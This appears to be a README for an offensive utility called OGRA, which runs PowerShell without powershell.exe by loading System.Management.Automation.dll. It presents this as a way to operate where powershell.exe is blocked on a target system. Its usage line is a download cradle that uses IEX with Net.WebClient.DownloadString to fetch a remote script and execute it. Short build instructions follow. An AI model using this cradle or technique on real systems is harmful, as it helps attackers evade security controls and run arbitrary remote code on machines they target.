# OGRA

Powershell(less) remote powershell script execution (Download Cradle method) via System.Management.Automation.dll.

Useful in situations where powershell.exe is blocked or not present on a target system.

Requires >= .NET Framework 4.5.2

Usage:
ogra.exe "IEX (New-Object Net.WebClient).DownloadString('https://remote/script.ps1');"

Prior to compiling, you'll need to add a Reference in your Visual Studio project to the system automation DLL. You can find the path to it by executing the following from a powershell prompt:

[PSObject].Assembly.Location
